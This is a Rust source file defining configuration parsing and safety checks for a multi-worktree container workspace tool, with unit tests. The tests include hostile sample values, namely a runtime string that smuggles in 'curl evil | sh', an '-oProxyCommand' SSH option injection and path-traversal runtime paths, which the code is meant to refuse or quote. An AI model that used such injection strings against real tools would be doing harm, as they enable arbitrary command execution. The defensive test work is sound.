use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

#[derive(Deserialize, Serialize, Default, schemars::JsonSchema)]
pub struct WsConfig {
    #[serde(skip_serializing_if = "Option::is_none", default, rename = "$schema")]
    pub schema: Option<String>,
    /// Private TLD for per-worktree hostnames (routing), e.g. `myapp.test`.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub domain: Option<String>,
    /// Container runtime for `ws`'s own calls (compose introspection, the shared
    /// network, the Caddy container). `"podman"` | `"docker"`; default `"podman"`.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub runtime: Option<String>,
    /// Remote-offload block. Absent → the workspace runs locally. `.ws.json` is
    /// itself per-machine — it describes your local multi-repo layout, not a
    /// shared project config — so the remote target lives here directly rather
    /// than in a separate overlay file.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub remote: Option<RemoteConfig>,
    // Not a doc comment: this text would ship in the schema, where the per-entry
    // description from `repo_entries_schema` already covers it. Both spellings
    // deserialize to a full `RepoConfig` — see `deserialize_repos` for why a bare
    // name must not be a distinct state.
    #[serde(default, deserialize_with = "deserialize_repos", serialize_with = "serialize_repos")]
    #[schemars(schema_with = "repo_entries_schema")]
    pub repos: Vec<RepoConfig>,
}

/// A **bare-name** entry (`"api"`) is not an opt-out — it means the object entry
/// with no overrides, and everything downstream (derive, project name, override,
/// routes) must treat the two spellings alike. When a bare name deserialized to a
/// distinct state, a bare-name compose repo ran with no `COMPOSE_PROJECT_NAME`,
/// a second worktree's `up` adopted the first's containers, and `ws rm`'s
/// `compose down -v` wiped the sibling's volumes. Collapsing the spelling here,
/// at the parse, is what keeps that state unrepresentable.
fn deserialize_repos<'de, D>(d: D) -> Result<Vec<RepoConfig>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    #[derive(Deserialize)]
    #[serde(untagged)]
    enum Entry {
        Name(String),
        Extended(RepoConfig),
    }
    Ok(Vec::<Entry>::deserialize(d)?
        .into_iter()
        .map(|e| match e {
            Entry::Name(name) => RepoConfig { name, ..Default::default() },
            Entry::Extended(rc) => rc,
        })
        .collect())
}

/// The write half of the shorthand: an entry that is all defaults serializes back
/// to its bare name, so `ws remote set/unset`'s full-file rewrite round-trips a
/// hand-written `"repos": ["api"]`. The comparison is against a default-plus-name
/// value rather than a hand-kept field list, so a new `RepoConfig` field can't
/// silently stop bare names from round-tripping.
fn serialize_repos<S>(repos: &[RepoConfig], s: S) -> Result<S::Ok, S::Error>
where
    S: serde::Serializer,
{
    #[derive(Serialize)]
    #[serde(untagged)]
    enum Entry<'a> {
        Name(&'a str),
        Extended(&'a RepoConfig),
    }
    s.collect_seq(repos.iter().map(|rc| {
        if *rc == (RepoConfig { name: rc.name.clone(), ..Default::default() }) {
            Entry::Name(&rc.name)
        } else {
            Entry::Extended(rc)
        }
    }))
}

/// The schema the derive would have produced for the deleted two-variant entry
/// enum: an array whose items are a bare string or a full [`RepoConfig`]. Editor
/// completion for `"repos": ["api"]` depends on the string arm staying offered.
fn repo_entries_schema(gen: &mut schemars::gen::SchemaGenerator) -> schemars::schema::Schema {
    use schemars::schema::*;
    let entry = SchemaObject {
        metadata: Some(Box::new(Metadata {
            description: Some(
                "A repo entry is either a bare name (convention-only) or an object with overrides."
                    .to_string(),
            ),
            ..Default::default()
        })),
        subschemas: Some(Box::new(SubschemaValidation {
            any_of: Some(vec![
                SchemaObject { instance_type: Some(InstanceType::String.into()), ..Default::default() }.into(),
                gen.subschema_for::<RepoConfig>(),
            ]),
            ..Default::default()
        })),
        ..Default::default()
    };
    SchemaObject {
        instance_type: Some(InstanceType::Array.into()),
        array: Some(Box::new(ArrayValidation {
            items: Some(SingleOrVec::Single(Box::new(entry.into()))),
            ..Default::default()
        })),
        ..Default::default()
    }
    .into()
}

/// Remote-offload block. When present, every repo's stack runs on the server and
/// location-transparent ops (`ws exec`, `up`/`down`) target it. `runtime` and
/// `domain` are deliberately not here: routing applies to local workspaces too,
/// so they stay top-level on `WsConfig`.
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
pub struct RemoteConfig {
    /// SSH host to reach the server — a Tailscale MagicDNS name or `~/.ssh/config` alias.
    pub connection: String,
    /// Parent dir on the server holding the synced worktrees. Relative paths are
    /// resolved against the SSH login home; absolute paths are used verbatim.
    /// Omitted → the workspace's own directory name, so two projects on one
    /// server don't collide.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace_path: Option<String>,
    /// Address the server's Caddy publishes its HTTPS port on. Omitted → all
    /// interfaces, because the whole point of offload is that *another* machine
    /// reaches it; loopback would serve only the server itself. Set it to pin the
    /// server to one address — its tailnet or LAN IP — so a box with a public
    /// interface doesn't serve your worktrees to the internet. Any address the
    /// client can route to works; nothing here assumes Tailscale.
    ///
    /// **Only read when Caddy is created.** Changing it recreates the container on
    /// the next `ws up` (routes survive — they reload from the config volume).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub publish_address: Option<String>,
}

impl RemoteConfig {
    pub fn new(connection: String, workspace_path: Option<String>) -> Self {
        // Unset `publish_address` publishes on all interfaces, which is the
        // working default; pinning one is a deliberate narrowing.
        Self { connection, workspace_path, publish_address: None }
    }

    pub fn worktree_base(&self, ws_root: &Path) -> String {
        self.workspace_path.clone().unwrap_or_else(|| default_worktree_base(ws_root))
    }
}

/// Rewrite a `.ws-hooks/`-relative command to run under `$WS_WORKSPACE_ROOT`, which
/// `ws` sets in the hook env both locally and on the server, so one config string
/// resolves in either place regardless of the worktree cwd. The var is quoted so a
/// workspace path with spaces still resolves as one word.
pub fn anchor_ws_hooks(cmd: &str) -> String {
    match cmd.strip_prefix(".ws-hooks/") {
        Some(rest) => format!("\"$WS_WORKSPACE_ROOT\"/.ws-hooks/{rest}"),
        None => cmd.to_string(),
    }
}

/// The server-side worktree base when none is configured: the workspace's own
/// directory name, so two projects on one server don't collide. A free function
/// because `ws remote check --host` has no `RemoteConfig` to ask.
pub fn default_worktree_base(ws_root: &Path) -> String {
    ws_root
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "workspace".to_string())
}

#[derive(Deserialize, Serialize, schemars::JsonSchema, Default, PartialEq)]
pub struct RepoConfig {
    pub name: String,
    /// How `ws` launches and de-conflicts this repo's stack. `None` → inferred
    /// (a compose file present ⇒ `Container`, else `Host`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kind: Option<RepoKind>,
    /// Routing + per-service ports. For a compose repo this is auto-derived from
    /// `<runtime> compose config` at `ws up` and this block is an optional
    /// override layer; for a host repo it's required (nothing to introspect).
    /// A `BTreeMap` so serialization order is stable.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub services: BTreeMap<String, ServiceConfig>,
    /// Declarative lifecycle commands, keyed by event (`prepare`, `post-create`,
    /// `up`, `down`, `post-remove`, `status`). Each is one command or an array of
    /// commands, run via `sh -c` with the `WS_*` env forwarded. A value may be a
    /// path to a script file for complex logic — a `.ws-hooks/…` path is anchored
    /// to the workspace root (see [`anchor_ws_hooks`]) so it resolves wherever the
    /// script runs.
    ///
    /// Most events run **where the stack lives** (the server, for a remote
    /// workspace). The exception is **`prepare`**: it runs on the **client** just
    /// before `up`, even when offloading, so it can stage data that only exists
    /// locally (dump the main checkout's db, gather local certs) into the worktree
    /// — the up flush then carries it to the server. It sees `WS_REMOTE`, so one
    /// script can branch.
    ///
    /// A `BTreeMap` so a config rewrite (`ws remote set/unset`) is deterministic:
    /// `.ws.json` isn't gitignored, and hash-random key order would churn a
    /// possibly-committed file.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub scripts: BTreeMap<String, Script>,
    /// Explicit env-var injection: your app's var name → a `${WS_*}` template.
    /// `ws` owns `WS_HOST_*`/`WS_PORT_*`; you declare which of your vars get them.
    /// Reference a *sibling* repo's service with `${WS_HOST_<repo>.<svc>}` /
    /// `${WS_PORT_<repo>.<svc>}` (e.g. an api's SSO redirect needs the app's
    /// `${WS_PORT_app.web}`); the peer's value comes from its recorded allocation,
    /// so an unbuilt peer leaves the token literal. A `BTreeMap` so the generated
    /// override's `environment:` lines come out in a deterministic order.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub env: BTreeMap<String, String>,
    /// Format-blind config templates (the escape hatch): a committed `src`
    /// rendered to a gitignored `dest` with `${WS_*}` tokens substituted.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub templates: Vec<Template>,
    /// Untracked files to seed verbatim from the main checkout into each new
    /// worktree at `ws new` (before post-create, and before a remote sync so they
    /// ride it to the server). Each entry is a repo-relative path — a file, a
    /// directory (copied recursively), or a glob (`storage/oauth-*.key`).
    /// No-clobber (an existing dest is left as-is), and a source with no match is
    /// skipped. Unlike `templates` the bytes are copied as-is, no substitution —
    /// this is the lane for dev certs/keys/env that aren't in git.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub copy: Vec<String>,
    /// Per-worktree git-exclude entries appended to <wt>/.git/info/exclude.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub worktree_excludes: Vec<String>,
}

/// How a repo's stack is launched and its ports de-conflicted.
#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone, Copy, PartialEq, Eq, Debug)]
#[serde(rename_all = "lowercase")]
pub enum RepoKind {
    /// Compose stack. N copies de-conflicted via a generated compose override;
    /// supervised by the runtime.
    Container,
    /// Host process (e.g. `cargo run`). Supervised as a detached `ws`-owned
    /// process (PID-file tracked), local or on the server -- no systemd/launchd.
    Host,
}

/// A single service within a repo: its port and whether it's HTTP-routed.
#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone, PartialEq)]
pub struct ServiceConfig {
    /// HTTP routing. A string is the subdomain (`"api"` → `<branch>.api.<domain>`);
    /// `true` routes it using the service name as the subdomain; absent or `false`
    /// means raw TCP — `ws` allocates a host port and exposes `WS_PORT_<service>`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub http: Option<HttpDecl>,
    /// The container-internal (or host-process-bound) port for this service.
    pub port: u16,
    /// **Not yet implemented — accepted and currently ignored.** Intended to run
    /// this service once as shared infra instead of per-worktree (right for
    /// redis/ES; wrong for the SQL DB). Every service is per-worktree today.
    #[serde(default, skip_serializing_if = "is_false")]
    pub shared: bool,
    /// Also route *every* subdomain of this service's host to it, so a
    /// multi-tenant app addressed as `<tenant>.<branch>.<subdomain>.<domain>`
    /// resolves for any `<tenant>`. HTTP services only (raw-TCP has no host).
    /// `WS_HOST_<svc>` stays the base host, so the app builds tenant URLs as
    /// `<tenant>.$WS_HOST_<svc>`.
    #[serde(default, skip_serializing_if = "is_false")]
    pub wildcard: bool,
}

impl RepoConfig {
    /// `has_compose` is a closure so the filesystem is only touched when `kind`
    /// is absent.
    pub fn is_container(&self, has_compose: impl FnOnce() -> bool) -> bool {
        match self.kind {
            Some(RepoKind::Container) => true,
            Some(RepoKind::Host) => false,
            None => has_compose(),
        }
    }

    /// Deliberately requires the explicit kind rather than inferring host from a
    /// missing compose file the way `is_container` infers container: this is the
    /// trigger for process supervision and port allocation, so it stays opt-in.
    pub fn is_host(&self) -> bool {
        matches!(self.kind, Some(RepoKind::Host))
    }
}

impl ServiceConfig {
    pub fn subdomain<'a>(&'a self, service_name: &'a str) -> Option<&'a str> {
        match &self.http {
            Some(HttpDecl::Subdomain(s)) => Some(s),
            Some(HttpDecl::Enabled(true)) => Some(service_name),
            _ => None,
        }
    }

    pub fn is_http(&self) -> bool {
        matches!(self.http, Some(HttpDecl::Subdomain(_)) | Some(HttpDecl::Enabled(true)))
    }
}

/// How a service participates in HTTP routing.
#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone, PartialEq)]
#[serde(untagged)]
pub enum HttpDecl {
    /// Explicit subdomain label.
    Subdomain(String),
    /// `true` → route as HTTP with the service name as the subdomain; `false` → not HTTP.
    Enabled(bool),
}

/// A lifecycle command: one shell command, or several run in order.
#[derive(Deserialize, Serialize, schemars::JsonSchema, PartialEq)]
#[serde(untagged)]
pub enum Script {
    One(String),
    Many(Vec<String>),
}

impl Script {
    pub fn commands(&self) -> &[String] {
        match self {
            Script::One(s) => std::slice::from_ref(s),
            Script::Many(v) => v,
        }
    }

    /// The commands as one fail-fast shell command (`cmd1 && cmd2`), with
    /// `.ws-hooks/…` references anchored (see [`anchor_ws_hooks`]). Resolved once
    /// by [`crate::hooks::resolve`] and dispatched to either site from there, so
    /// the anchoring can't differ between local and server.
    pub fn joined(&self) -> String {
        self.commands().iter().map(|c| anchor_ws_hooks(c)).collect::<Vec<_>>().join(" && ")
    }
}

/// A format-blind config template: render `src` → `dest` with `${WS_*}` tokens.
#[derive(Deserialize, Serialize, schemars::JsonSchema, PartialEq)]
pub struct Template {
    pub src: String,
    pub dest: String,
}

fn is_false(b: &bool) -> bool {
    !*b
}

impl WsConfig {
    /// The default lives here, not at the call sites, so compose introspection,
    /// Caddy and the hook defaults can't disagree on the runtime.
    pub fn runtime(&self) -> &str {
        self.runtime.as_deref().unwrap_or("podman")
    }

    /// The config for `repo`. `None` only when `repo` isn't an entry in this
    /// workspace at all — a bare-name entry is a full all-defaults config, not a
    /// `None` (see [`deserialize_repos`]).
    pub fn repo_config(&self, repo: &str) -> Option<&RepoConfig> {
        self.repos.iter().find(|r| r.name == repo)
    }

    pub fn is_host_repo(&self, repo: &str) -> bool {
        self.repo_config(repo).map(RepoConfig::is_host).unwrap_or(false)
    }

    /// A repo with no entry at all still gets the compose-file inference, so an
    /// op pointed at an unlisted repo behaves like one listed with no `kind`.
    pub fn is_container_repo(&self, repo: &str, worktree: &Path) -> bool {
        let has = || crate::compose::has_compose_file(worktree);
        match self.repo_config(repo) {
            Some(rc) => rc.is_container(has),
            None => has(),
        }
    }

    /// The declared rung of [`crate::hooks::resolve`]'s ladder. The host-repo
    /// launch path reads it directly, because a supervised process takes no
    /// compose default.
    pub fn script_command(&self, repo: &str, event: &str) -> Option<String> {
        self.repo_config(repo).and_then(|rc| rc.scripts.get(event)).map(Script::joined)
    }

    pub fn routing_active(&self) -> bool {
        self.domain.is_some()
    }
}

/// The compose command a **container** repo falls back to for a lifecycle event
/// when it declares no script.
///
/// `post-remove`'s `-v` reaps the worktree's volumes: they're `ws`-namespaced
/// (`COMPOSE_PROJECT_NAME=<branch>-<repo>`), so a plain `compose down` would orphan
/// them and recreating the branch would silently reuse stale data. It is reached at
/// destroy time only (`ws rm` / `ws clean`) — never `ws down`, which must stay
/// reversible. `post-create` gets no default: there's no generic "set this project
/// up" step.
///
/// `runtime` is `shell_quote`d: these run via `sh -c` and the value comes from a
/// possibly-cloned `.ws.json` (same posture as `compose::remote_compose_script`).
pub fn default_script(runtime: &str, event: &str) -> Option<String> {
    let args = match event {
        "up" => "compose up -d",
        "down" => "compose down",
        "status" => "compose ps -q | wc -l",
        "post-remove" => "compose down -v",
        _ => return None,
    };
    Some(format!("{} {args}", crate::remote::shell_quote(runtime)))
}

/// Whether `runtime` is safe to hand to the process spawner as `argv[0]`.
///
/// `.ws.json` isn't gitignored, so this value arrives with a clone, and Rust runs
/// any program string containing `/` as a path **relative to the process cwd** —
/// the very workspace the hostile config came in. A clone carrying
/// `{"runtime": ".ws-hooks/helper"}` plus a committed, executable `.ws-hooks/helper`
/// would run it on the first `ws setup` / `ws remote check`, before any prompt.
/// `shell_quote` is no defence: the value *is* the program, not a shell word.
///
/// So: a bare name for `PATH` to resolve, or an absolute path. Deliberately not an
/// allow-list of two names — people do run other runtimes — the point is only that
/// a cloned config can't name a program inside the clone.
fn runtime_looks_safe(runtime: &str) -> bool {
    // Whitespace/control chars can't appear in a real program name, and rejecting
    // them keeps a hostile value from smuggling escape sequences into output.
    if runtime.is_empty()
        || runtime.starts_with('-')
        || runtime.chars().any(|c| c.is_whitespace() || c.is_control())
    {
        return false;
    }
    let Some(path) = runtime.strip_prefix('/') else {
        return !runtime.contains('/'); // bare name → PATH resolves it
    };
    // An absolute path is trusted, but `/proc/self/cwd/…` resolves straight back
    // into the clone and `..` climbs anywhere, so neither counts as one.
    let parts: Vec<&str> = path.split('/').collect();
    parts.first() != Some(&"proc")
        && parts.iter().all(|p| !p.is_empty() && *p != "." && *p != "..")
}

pub fn load(root: &Path) -> Result<WsConfig> {
    let path = root.join(".ws.json");
    let cfg: WsConfig = read_json(&path)?;
    refuse_legacy_hooks_field(&path)?;
    // The guards below run at the one choke point every op shares. `.ws.json`
    // isn't gitignored, so a cloned repo could carry a hostile
    // `remote.connection` like `-oProxyCommand=…` that `ssh` runs as a local
    // command. See `remote::connection_looks_safe`.
    if let Some(r) = &cfg.remote {
        if !crate::remote::connection_looks_safe(&r.connection) {
            anyhow::bail!(
                "refusing an unsafe remote.connection `{}` in .ws.json — an SSH host \
                 must not start with `-` (it would be parsed as an ssh option)",
                r.connection
            );
        }
        // Checked here, not at the point of use, so a typo surfaces on any command
        // rather than only the ones that bring routing up. A hostname is refused as
        // well as junk: it could resolve elsewhere later and silently move where
        // the server publishes.
        if let Some(a) = r.publish_address.as_deref().map(str::trim).filter(|a| !a.is_empty()) {
            match a.parse::<std::net::IpAddr>() {
                Ok(ip) if ip.is_multicast() => anyhow::bail!(
                    "remote.publish_address `{a}` in .ws.json is a multicast address — \
                     give an address of the server itself"
                ),
                Err(_) => anyhow::bail!(
                    "remote.publish_address `{a}` in .ws.json is not an IP address — \
                     give the server's tailnet/LAN address, or omit it to publish on all"
                ),
                Ok(_) => {}
            }
        }
    }
    // Same reason as `remote.connection`: the value comes from a possibly-cloned
    // `.ws.json` and is executed. See `runtime_looks_safe`.
    if let Some(rt) = cfg.runtime.as_deref() {
        if !runtime_looks_safe(rt) {
            anyhow::bail!(
                "refusing an unsafe runtime `{rt}` in .ws.json — the container runtime must \
                 be a bare program name (`podman`, `docker`) or an absolute path to one; a \
                 relative path would run a program out of the repo this config arrived in"
            );
        }
    }
    Ok(cfg)
}

/// Refuse a `.ws.json` still carrying a repo's `hooks` override map — the removed
/// hook-file mechanism. `WsConfig` has no `deny_unknown_fields`, so a leftover block
/// would parse silently and then be dropped the next time `ws remote set` rewrites
/// the file, editing the user's config out from under them. Migration shim: delete
/// with `hooks::refuse_legacy_hook_file`.
fn refuse_legacy_hooks_field(path: &Path) -> Result<()> {
    let raw = std::fs::read_to_string(path).unwrap_or_default();
    // Cheap gate: a `".ws-hooks/…"` script *value* has no quote before `hooks`, so
    // only a bare key reaches the reparse below.
    if !raw.contains("\"hooks\"") {
        return Ok(());
    }
    let Ok(v) = serde_json::from_str::<serde_json::Value>(
        raw.strip_prefix('\u{feff}').unwrap_or(&raw),
    ) else {
        return Ok(()); // Not our error to report — `read_json` already did.
    };
    let stale: Vec<&str> = v["repos"]
        .as_array()
        .map(|repos| {
            repos
                .iter()
                .filter(|r| r["hooks"].is_object())
                .filter_map(|r| r["name"].as_str())
                .collect()
        })
        .unwrap_or_default();
    if stale.is_empty() {
        return Ok(());
    }
    anyhow::bail!(
        "`hooks` in {} ({}) points at the hook-file mechanism removed in ws 0.6 — move each \
         entry into that repo's `scripts` block instead. The contract changed with it: a script \
         runs with cwd = the worktree (not the workspace root), and the worktree path arrives as \
         $WS_WORKTREE (not $1).",
        path.display(),
        stale.join(", "),
    )
}

/// The machine-global `ws` config dir: cross-workspace state (the global config,
/// the pinned Caddy boot config, the persisted HTTPS port, the exported root CA).
pub fn global_dir() -> PathBuf {
    if let Ok(x) = std::env::var("XDG_CONFIG_HOME") {
        if !x.is_empty() {
            return PathBuf::from(x).join("ws");
        }
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
    PathBuf::from(home).join(".config").join("ws")
}

/// Cross-workspace defaults at `~/.config/ws/config.toml`, written by `ws config
/// set`. Today only the remote host a bare `ws init --remote` / `ws remote set`
/// falls back to (precedence: flag > `$WS_REMOTE_HOST` > this).
///
/// `deny_unknown_fields` here and on the sections: `ws config set` rewrites this
/// whole file, so an unknown key (a typo'd hand-edit, or a section a newer `ws`
/// wrote before a downgrade) that parsed silently would be silently DROPPED on the
/// next write.
#[derive(Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
pub struct GlobalConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    remote: Option<GlobalRemote>,
}

#[derive(Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
struct GlobalRemote {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    host: Option<String>,
}

pub const GLOBAL_KEYS: &[&str] = &["remote.host"];

fn unknown_key(key: &str) -> anyhow::Error {
    anyhow::anyhow!("unknown config key `{key}` — known keys: {}", GLOBAL_KEYS.join(", "))
}

impl GlobalConfig {
    pub fn path() -> PathBuf {
        global_dir().join("config.toml")
    }

    /// A missing file is an empty config; a malformed one is an error, never a
    /// silent default that would drop the user's edits on the next `save`.
    pub fn load() -> Result<Self> {
        let p = Self::path();
        let raw = match std::fs::read_to_string(&p) {
            Ok(s) => s,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Self::default()),
            Err(e) => return Err(e).with_context(|| format!("read {}", p.display())),
        };
        toml::from_str(&raw).with_context(|| format!("parse {}", p.display()))
    }

    pub fn save(&self) -> Result<()> {
        let dir = global_dir();
        std::fs::create_dir_all(&dir).with_context(|| format!("create {}", dir.display()))?;
        let s = toml::to_string_pretty(self).context("serialize global config")?;
        std::fs::write(Self::path(), s).with_context(|| format!("write {}", Self::path().display()))
    }

    pub fn get(&self, key: &str) -> Result<Option<&str>> {
        match key {
            "remote.host" => Ok(self.remote_host()),
            _ => Err(unknown_key(key)),
        }
    }

    pub fn set(&mut self, key: &str, value: &str) -> Result<()> {
        match key {
            "remote.host" => {
                // Same guard as `.ws.json`'s remote.connection: this value ends
                // up as an ssh argv element, so an option-shaped host is refused.
                crate::remote::ensure_connection_safe(value)?;
                self.remote.get_or_insert_with(Default::default).host = Some(value.to_string());
            }
            _ => return Err(unknown_key(key)),
        }
        Ok(())
    }

    /// Returns whether the key was set.
    pub fn unset(&mut self, key: &str) -> Result<bool> {
        match key {
            // `host` is [remote]'s only field, so taking the whole section is
            // right — no bare `[remote]` header lingers in the file. Revisit
            // (prune only when all fields are None) when a second key lands.
            "remote.host" => Ok(self.remote.take().is_some_and(|r| r.host.is_some())),
            _ => Err(unknown_key(key)),
        }
    }

    pub fn remote_host(&self) -> Option<&str> {
        self.remote.as_ref().and_then(|r| r.host.as_deref())
    }
}

/// The single home for the on-disk JSON style `ws` writes (`.ws.json`, the
/// schema, `.ws-meta`).
pub fn write_json_pretty<T: Serialize>(path: &Path, value: &T) -> Result<()> {
    let s = serde_json::to_string_pretty(value)?;
    std::fs::write(path, format!("{s}\n")).with_context(|| format!("write {}", path.display()))
}

fn read_json<T: for<'de> Deserialize<'de>>(p: &Path) -> Result<T> {
    let raw = std::fs::read_to_string(p)
        .with_context(|| format!("read {}", p.display()))?;
    // Some Windows editors materialize a leading BOM; serde_json otherwise
    // reports the opaque `expected value at line 1 column 1`.
    let trimmed = raw.strip_prefix('\u{feff}').unwrap_or(&raw);
    serde_json::from_str(trimmed).with_context(|| format!("parse {}", p.display()))
}

#[cfg(test)]
mod tests {
    use super::anchor_ws_hooks;

    #[test]
    fn anchor_ws_hooks_prefixes_only_a_ws_hooks_reference() {
        assert_eq!(
            anchor_ws_hooks(".ws-hooks/up.sh"),
            "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/up.sh"
        );
        assert_eq!(
            anchor_ws_hooks(".ws-hooks/db/seed.sh --fresh"),
            "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/db/seed.sh --fresh"
        );
        assert_eq!(anchor_ws_hooks("podman compose up -d"), "podman compose up -d");
        assert_eq!(anchor_ws_hooks("echo .ws-hooks/x"), "echo .ws-hooks/x");
    }

    #[test]
    fn container_defaults_cover_the_compose_lifecycle() {
        assert_eq!(default_script("podman", "up").as_deref(), Some("podman compose up -d"));
        assert_eq!(default_script("docker", "down").as_deref(), Some("docker compose down"));
        assert_eq!(
            default_script("podman", "status").as_deref(),
            Some("podman compose ps -q | wc -l")
        );
        assert_eq!(
            default_script("podman", "post-remove").as_deref(),
            Some("podman compose down -v")
        );
        assert_eq!(default_script("podman", "post-create"), None);
        assert_eq!(default_script("podman", "nonsense"), None);
    }

    #[test]
    fn default_script_quotes_a_hostile_runtime() {
        // `runtime` comes from a possibly-cloned `.ws.json` and these run via `sh -c`.
        let s = default_script("podman; curl evil | sh #", "down").unwrap();
        assert!(s.starts_with("'podman; curl evil | sh #' compose down"), "{s}");
    }

    use super::*;

    fn write_cfg(dir: &Path, json: &str) {
        std::fs::write(dir.join(".ws.json"), json).unwrap();
    }

    #[test]
    fn load_refuses_a_publish_address_that_isnt_an_address() {
        for bad in ["localhost", "1.2.3.4:8443", "0.0.0.0/0", "not-an-ip", "224.0.0.1"] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(
                dir.path(),
                &format!(
                    r#"{{"repos":[],"remote":{{"connection":"h","publish_address":"{bad}"}}}}"#
                ),
            );
            let err = match load(dir.path()) {
                Err(e) => e.to_string(),
                Ok(_) => panic!("expected {bad:?} to be refused"),
            };
            assert!(
                err.contains("publish_address"),
                "expected {bad:?} refused, got: {err}"
            );
        }
    }

    #[test]
    fn load_accepts_ipv4_ipv6_and_an_absent_publish_address() {
        for good in [r#","publish_address":"100.64.1.3""#, r#","publish_address":"fd7a::1""#, ""] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(
                dir.path(),
                &format!(r#"{{"repos":[],"remote":{{"connection":"h"{good}}}}}"#),
            );
            assert!(load(dir.path()).is_ok(), "expected {good:?} accepted");
        }
    }

    /// Delete with the migration shim it covers.
    #[test]
    fn load_refuses_a_leftover_hooks_override_map() {
        let dir = tempfile::tempdir().unwrap();
        write_cfg(dir.path(), r#"{"repos":[{"name":"api","hooks":{"up":".ws-hooks/api/up"}}]}"#);
        let err = load(dir.path()).err().expect("a `hooks` block must be refused").to_string();
        assert!(err.contains("`hooks`") && err.contains("api"), "{err}");
        assert!(err.contains("$WS_WORKTREE"), "the new worktree contract must be named: {err}");

        // A `.ws-hooks/…` *script* value must not trip the cheap substring gate.
        write_cfg(dir.path(), r#"{"repos":[{"name":"api","scripts":{"up":".ws-hooks/api/up"}}]}"#);
        assert!(load(dir.path()).is_ok());
    }

    #[test]
    fn read_json_strips_utf8_bom() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(tmp.path(), "\u{feff}{\"repos\":[]}").unwrap();
        let cfg: WsConfig = read_json(tmp.path()).unwrap();
        assert!(cfg.repos.is_empty());
    }

    #[test]
    fn parses_top_level_domain_runtime_and_remote() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"domain":"myapp.test","repos":["api"],"remote":{"connection":"srv","workspace_path":"workspace"}}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        assert_eq!(cfg.domain.as_deref(), Some("myapp.test"));
        assert_eq!(cfg.runtime(), "podman");
        let remote = cfg.remote.expect("remote block");
        assert_eq!(remote.connection, "srv");
        assert_eq!(remote.workspace_path.as_deref(), Some("workspace"));
    }

    #[test]
    fn load_rejects_an_option_shaped_remote_connection() {
        // A hostile `.ws.json` can arrive via a clone (it isn't gitignored).
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"remote":{"connection":"-oProxyCommand=touch /tmp/pwned"},"repos":[]}"#,
        )
        .unwrap();
        let err = load(dir.path()).err().expect("load should reject the connection");
        assert!(
            err.to_string().contains("unsafe remote.connection"),
            "expected the load to reject an option-shaped connection: {err}"
        );
    }

    #[test]
    fn runtime_override_is_read() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".ws.json"), r#"{"runtime":"docker","repos":[]}"#).unwrap();
        assert_eq!(load(dir.path()).unwrap().runtime(), "docker");
    }

    #[test]
    fn load_refuses_a_runtime_that_isnt_a_program_name() {
        // The value is executed as `argv[0]`, so a cloned `.ws.json` must not be
        // able to name a program inside the clone.
        for bad in [
            ".ws-hooks/setup-helper",
            "./payload",
            "../evil/podman",
            "sub/dir/podman",
            "/proc/self/cwd/.ws-hooks/setup-helper",
            "/usr/bin/../../tmp/payload",
            "-oProxyCommand=x",
            "podman --remote",
            "",
        ] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(dir.path(), &format!(r#"{{"runtime":"{bad}","repos":[]}}"#));
            let err = match load(dir.path()) {
                Err(e) => e.to_string(),
                Ok(_) => panic!("expected runtime {bad:?} to be refused"),
            };
            assert!(err.contains("unsafe runtime"), "expected {bad:?} refused, got: {err}");
        }
    }

    #[test]
    fn load_accepts_any_bare_or_absolute_runtime() {
        // Not an allow-list of two names — people do run other runtimes.
        for good in ["podman", "docker", "nerdctl", "podman-remote", "/usr/local/bin/podman"] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(dir.path(), &format!(r#"{{"runtime":"{good}","repos":["api"]}}"#));
            let cfg = match load(dir.path()) {
                Ok(c) => c,
                Err(e) => panic!("expected runtime {good:?} accepted: {e}"),
            };
            assert_eq!(cfg.runtime(), good);
        }
    }

    #[test]
    fn parses_extended_repo_with_services_scripts_env_templates() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"repos":[{
                "name":"api","kind":"container",
                "services":{"app":{"http":"api","port":80},"mysql":{"port":3306},"redis":{"port":6379,"shared":true}},
                "scripts":{"post-create":["composer install","php artisan migrate"],"up":"docker compose up -d"},
                "env":{"APP_URL":"https://${WS_HOST_app}"},
                "templates":[{"src":"nginx.conf.tmpl","dest":"nginx.conf"}]
            }]}"#,
        )
        .unwrap();
